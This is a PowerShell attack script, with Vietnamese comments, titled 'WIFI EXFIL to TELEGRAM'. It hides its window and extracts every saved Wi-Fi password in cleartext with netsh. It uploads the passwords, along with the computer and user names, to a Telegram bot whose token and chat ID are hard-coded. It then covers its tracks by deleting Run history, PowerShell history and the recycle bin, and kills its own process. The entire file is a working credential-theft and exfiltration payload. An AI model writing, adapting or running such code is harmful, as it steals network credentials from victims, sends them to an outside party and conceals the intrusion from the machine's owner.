<# 
============================================ WIFI EXFIL to TELEGRAM ============================================
#>
param(
    [string]$hide = 'y'
)

# 1. Cơ chế ẩn cửa sổ (Stealth Mode)
if($hide -eq 'y'){
    $w=(Get-Process -PID $pid).MainWindowHandle
    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
    $t=Add-Type -MemberDefinition $a -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
    if($w -ne [System.IntPtr]::Zero){ [void]$t::ShowWindowAsync($w,0) }
}

# 2. Thiết lập Telegram
$Token   = "8734606734:AAEW7nl8oRmtFKZV2SdVgtUAnWtPcH7bThw"
$ChatID  = "8312702210"
$TeleURL = "https://api.telegram.org/bot$Token/sendDocument"
$outFile = "$env:TEMP\--wifi-pass.txt"

# 3. Thu thập dữ liệu Wifi
$wifiResults = @()
$profiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }

foreach ($name in $profiles) {
    $pass = (netsh wlan show profile name="$name" key=clear) | 
            Select-String "Key Content\W+\:(.+)$" | 
            ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
    
    if ($pass) {
        $wifiResults += [PSCustomObject]@{ SSID = $name; Password = $pass }
    } else {
        $wifiResults += [PSCustomObject]@{ SSID = $name; Password = "<Open or No Key>" }
    }
}

# Xuất ra file tạm
$wifiResults | Format-Table -AutoSize | Out-String | Out-File $outFile -Encoding UTF8

# 4. Gửi lên Telegram
if (Test-Path $outFile) {
    # Gửi thông báo bằng văn bản trước (Tùy chọn)
    $msg = "Wifi Report from: $env:COMPUTERNAME | User: $env:USERNAME"
    curl.exe -X POST "https://api.telegram.org/bot$Token/sendMessage" -d "chat_id=$ChatID" -d "text=$msg" | Out-Null
    
    # Gửi file report
    curl.exe -X POST $TeleURL -F "chat_id=$ChatID" -F "document=@$outFile" | Out-Null
}

# 5. XÓA DẤU VẾT (Clean-Exfil)
function Clean-Exfil { 
    # Xóa file report vừa tạo
    if (Test-Path $outFile) { Remove-Item $outFile -Force }

    # Xóa lịch sử hộp thoại Run (Win + R)
    reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f -ErrorAction SilentlyContinue

    # Xóa lịch sử lệnh PowerShell (Dấu vết quan trọng nhất)
    Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue

    # Dọn thùng rác
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
}

# Thực thi dọn dẹp
Clean-Exfil

# Thoát hoàn toàn tiến trình để không hiện trong Task Manager
Stop-Process -Id $PID -Force
